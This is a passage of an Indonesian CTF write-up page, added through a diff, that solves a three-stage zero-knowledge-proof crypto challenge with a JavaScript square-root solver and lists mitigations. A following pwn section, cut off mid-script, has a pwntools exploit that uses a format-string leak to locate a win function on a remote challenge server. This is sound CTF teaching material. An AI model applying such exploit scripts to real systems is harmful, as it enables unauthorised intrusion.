+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;blindingPattern&#34;</span><span class="p">:</span> <span class="s2">&#34;377ff27d767d6b7c&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;token&#34;</span><span class="p">:</span> <span class="s2">&#34;e8cba586b5317e73abcfd70de15b54e97c0caf4a1f0db2ce3d61fc0e67188228&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;nextStage&#34;</span><span class="p">:</span> <span class="s2">&#34;/circuit&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>-&gt; <strong>Stage 2 Token:</strong> <code>e8cba586b5317e73abcfd70de15b54e97c0caf4a1f0db2ce3d61fc0e67188228</code></p>
+<p><strong>🔢 Stage 3: Circuit Verification (Arithmetic Circuit)</strong></p>
+<p><strong>Challenge Analysis</strong></p>
+<p>Stage 3 menggunakan <strong>Arithmetic Circuit</strong> dalam finite field untuk memverifikasi knowledge of witness.</p>
+<p><strong>Circuit Info:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">circuitInfo</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/stage3/circuit-info&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span></span></span></code></pre></div></div>
+<p><strong>Response:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;Prove you can access the flag vault&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;circuit&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;quadratic_residue&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;publicInput&#34;</span><span class="p">:</span> <span class="s2">&#34;189a4b2b5aa5655683b2f7fefdfa2d04e1e17a58a27af05be5ae28416fef48a9&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;constraint&#34;</span><span class="p">:</span> <span class="s2">&#34;x * x = public_input (mod prime)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;prime&#34;</span><span class="p">:</span> <span class="s2">&#34;fffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;note&#34;</span><span class="p">:</span> <span class="s2">&#34;Submit a valid witness (x) that satisfies the circuit&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>Mathematical Problem</strong></p>
+<p>Kita perlu menemukan <code>x</code>, di mana:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>x² ≡ y (mod p)
+
+Dimana:
+y = 0x189a4b2b5aa5655683b2f7fefdfa2d04e1e17a58a27af05be5ae28416fef48a9
+p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f (secp256k1 prime)</code></pre></div>
+<p><strong>Hint Analysis</strong></p>
+<p>Server memberikan hint: <strong>&ldquo;The circuit has no range constraints. Think about alternative solutions&hellip;&rdquo;</strong></p>
+<p>Ini mengindikasikan potensi vulnerability, namun setelah testing berbagai bypass (negative values, large values, dll), ternyata kita tetap perlu menghitung square root yang valid.</p>
+<p><strong>Solution: Computing Square Root in Finite Field</strong></p>
+<p>Untuk prime secp256k1 dimana <code>p ≡ 3 (mod 4)</code>, kita dapat menggunakan formula sederhana:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>x = y^((p+1)/4) mod p</code></pre></div>
+<p><strong>Solver Script</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">solveStage3</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="s2">&#34;e8cba586b5317e73abcfd70de15b54e97c0caf4a1f0db2ce3d61fc0e67188228&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">publicInput</span> <span class="o">=</span> <span class="s2">&#34;189a4b2b5aa5655683b2f7fefdfa2d04e1e17a58a27af05be5ae28416fef48a9&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">prime</span> <span class="o">=</span> <span class="s2">&#34;fffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">prime</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">y</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">publicInput</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;=== COMPUTING SQUARE ROOT IN FINITE FIELD ===\n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Fast modular exponentiation
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nx">modPow</span><span class="p">(</span><span class="nx">base</span><span class="p">,</span> <span class="nx">exponent</span><span class="p">,</span> <span class="nx">modulus</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">modulus</span> <span class="o">===</span> <span class="mi">1</span><span class="nx">n</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">base</span> <span class="o">=</span> <span class="nx">base</span> <span class="o">%</span> <span class="nx">modulus</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="nx">exponent</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">exponent</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">===</span> <span class="mi">1</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">result</span> <span class="o">=</span> <span class="p">(</span><span class="nx">result</span> <span class="o">*</span> <span class="nx">base</span><span class="p">)</span> <span class="o">%</span> <span class="nx">modulus</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">exponent</span> <span class="o">=</span> <span class="nx">exponent</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">base</span> <span class="o">=</span> <span class="p">(</span><span class="nx">base</span> <span class="o">*</span> <span class="nx">base</span><span class="p">)</span> <span class="o">%</span> <span class="nx">modulus</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Verify p ≡ 3 (mod 4)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">pMod4</span> <span class="o">=</span> <span class="nx">p</span> <span class="o">%</span> <span class="mi">4</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;p mod 4 =&#34;</span><span class="p">,</span> <span class="nx">pMod4</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span> <span class="c1">// Should be 3
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">pMod4</span> <span class="o">===</span> <span class="mi">3</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;✓ Using formula: x = y^((p+1)/4) mod p\n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">exponent</span> <span class="o">=</span> <span class="p">(</span><span class="nx">p</span> <span class="o">+</span> <span class="mi">1</span><span class="nx">n</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">modPow</span><span class="p">(</span><span class="nx">y</span><span class="p">,</span> <span class="nx">exponent</span><span class="p">,</span> <span class="nx">p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Computed x:&#34;</span><span class="p">,</span> <span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Verify
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">verification</span> <span class="o">=</span> <span class="p">(</span><span class="nx">x</span> <span class="o">*</span> <span class="nx">x</span><span class="p">)</span> <span class="o">%</span> <span class="nx">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;\nVerification: x² mod p =&#34;</span><span class="p">,</span> <span class="nx">verification</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Expected:                 &#34;</span><span class="p">,</span> <span class="nx">y</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Match:&#34;</span><span class="p">,</span> <span class="nx">verification</span> <span class="o">===</span> <span class="nx">y</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">verification</span> <span class="o">===</span> <span class="nx">y</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;\n✓✓✓ SQUARE ROOT VERIFIED!\n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// Submit witness
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/stage3/submit-proof&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> 
+</span></span><span class="line"><span class="cl">                    <span class="nx">token</span><span class="o">:</span> <span class="nx">token</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                    <span class="nx">witness</span><span class="o">:</span> <span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">})</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;\n🎉 CHALLENGE COMPLETED! 🎉\n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;FLAG:&#34;</span><span class="p">,</span> <span class="nx">result</span><span class="p">.</span><span class="nx">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;\nExplanation:&#34;</span><span class="p">,</span> <span class="nx">result</span><span class="p">.</span><span class="nx">explanation</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">solveStage3</span><span class="p">();</span></span></span></code></pre></div></div>
+<p><strong>Mathematical Explanation</strong></p>
+<p><strong>Mengapa formula ini bekerja?</strong></p>
+<p>Untuk prime <code>p</code> dimana <code>p ≡ 3 (mod 4)</code>, dan <code>y</code> adalah quadratic residue:</p>
+<ol>
+<li>Dari Fermat&rsquo;s Little Theorem: <code>y^(p-1) ≡ 1 (mod p)</code></li>
+<li>Maka: <code>y^((p-1)/2) ≡ ±1 (mod p)</code></li>
+<li>Untuk quadratic residue: <code>y^((p-1)/2) ≡ 1 (mod p)</code></li>
+<li>Kalikan kedua sisi dengan <code>y</code>: <code>y^((p+1)/2) ≡ y (mod p)</code></li>
+<li>Maka: <code>(y^((p+1)/4))² ≡ y (mod p)</code></li>
+<li>Jadi: <code>x = y^((p+1)/4)</code> adalah square root dari <code>y</code></li>
+</ol>
+<p><strong>Verification:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>x = y^((p+1)/4) mod p
+x² = y^((p+1)/2) mod p
+x² = y^((p-1)/2) · y mod p
+x² = 1 · y mod p  (karena y adalah QR)
+x² = y mod p  ✓</code></pre></div>
+<p><strong>Result</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Congratulations! You&#39;ve mastered all three stages!&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;flag&#34;</span><span class="p">:</span> <span class="s2">&#34;flag{k0s0ng_t4p1_1s1}&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;explanation&#34;</span><span class="p">:</span> <span class="s2">&#34;You successfully exploited weak nonce in Schnorr protocol, broken Pedersen commitment, and solved the arithmetic circuit constraint. These vulnerabilities demonstrate the importance of proper cryptographic implementation in zero-knowledge proof systems.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<hr>
+<h3 id="summary-of-vulnerabilities">Summary of Vulnerabilities</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Stage</th>
+          <th>Protocol</th>
+          <th>Vulnerability</th>
+          <th>Impact</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Stage 1</strong></td>
+          <td>Schnorr Signature</td>
+          <td>Weak/predictable nonce (k=1)</td>
+          <td>Complete authentication bypass - attacker dapat forge valid proof tanpa private key</td>
+      </tr>
+      <tr>
+          <td><strong>Stage 2</strong></td>
+          <td>Pedersen Commitment</td>
+          <td>Commitment used as blinding factor</td>
+          <td>Blinding factor dapat di-extract, breaking hiding property dari commitment</td>
+      </tr>
+      <tr>
+          <td><strong>Stage 3</strong></td>
+          <td>Arithmetic Circuit</td>
+          <td>No range constraints (claimed)</td>
+          <td>Hint menyesatkan - sebenarnya butuh valid square root computation, tapi lack of range constraint bisa diexploit dalam implementasi lain</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="mitigation--lessons-learned">Mitigation &amp; Lessons Learned</h3>
+<p><strong>Stage 1: Schnorr Protocol</strong></p>
+<p><strong>Problem:</strong> Deterministic/weak nonce generation<br>
+<strong>Solution:</strong></p>
+<ul>
+<li>Use cryptographically secure random number generator (CSPRNG)</li>
+<li>Implement RFC 6979 (deterministic k generation from private key + message hash)</li>
+<li>Never reuse nonces across signatures</li>
+</ul>
+<p><strong>Stage 2: Pedersen Commitment</strong></p>
+<p><strong>Problem:</strong> Blinding factor derivable from commitment<br>
+<strong>Solution:</strong></p>
+<ul>
+<li>Blinding factor must be truly random and kept secret</li>
+<li>Never expose or derive blinding factor from public commitment</li>
+<li>Use proper commitment scheme implementation (e.g., bulletproofs)</li>
+</ul>
+<p><strong>Stage 3: Arithmetic Circuit</strong></p>
+<p><strong>Problem:</strong> Insufficient constraints<br>
+<strong>Solution:</strong></p>
+<ul>
+<li>Implement proper range constraints in zkSNARK circuits</li>
+<li>Validate all inputs and intermediate values</li>
+<li>Use battle-tested circuit libraries (circom, bellman, etc.)</li>
+<li>Audit circuits for under-constrained operations</li>
+</ul>
+<hr>
+<h3 id="tools--techniques-used">Tools &amp; Techniques Used</h3>
+<ul>
+<li><strong>JavaScript BigInt:</strong> For arbitrary precision arithmetic in finite fields</li>
+<li><strong>Modular Exponentiation:</strong> Fast algorithm for computing <code>a^b mod n</code></li>
+<li><strong>Endpoint Discovery:</strong> API scanning and fuzzing</li>
+<li><strong>Cryptographic Analysis:</strong> Understanding ZKP protocol vulnerabilities</li>
+<li><strong>Browser DevTools:</strong> Console-based exploitation and debugging</li>
+</ul>
+<h3 id="flag-4">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>flag{k0s0ng_t4p1_1s1}</code></div>
+        </div>
+    </div>
+<hr>
+<h1 id="pwn-11">Pwn [1/1]</h1>
+<h2 id="todo">todo</h2>
+<h3 id="langkah-penyelesaian-5">Langkah Penyelesaian</h3>
+<p><em>TBU</em></p>
+<p>Ini adalah solver script:</p>
+<p><code>x.py</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./todo&#34;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># r = process(elf.path)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;103.139.192.187&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(r, &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="c1"># &#34;&#34;&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">title</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">title</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak ELF</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;%p&#34;</span><span class="p">)</span> <span class="c1"># 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">LEAK_ELF</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ELF_BASE</span> <span class="o">=</span> <span class="n">LEAK_ELF</span> <span class="o">-</span> <span class="mh">0x2008</span>
+</span></span><span class="line"><span class="cl"><span class="n">WIN</span> <span class="o">=</span> <span class="n">ELF_BASE</span> <span class="o">+</span> <span class="mh">0x1360</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;leak elf: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">LEAK_ELF</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;elf base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ELF_BASE</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;win: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">WIN</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Try overwrite</span>
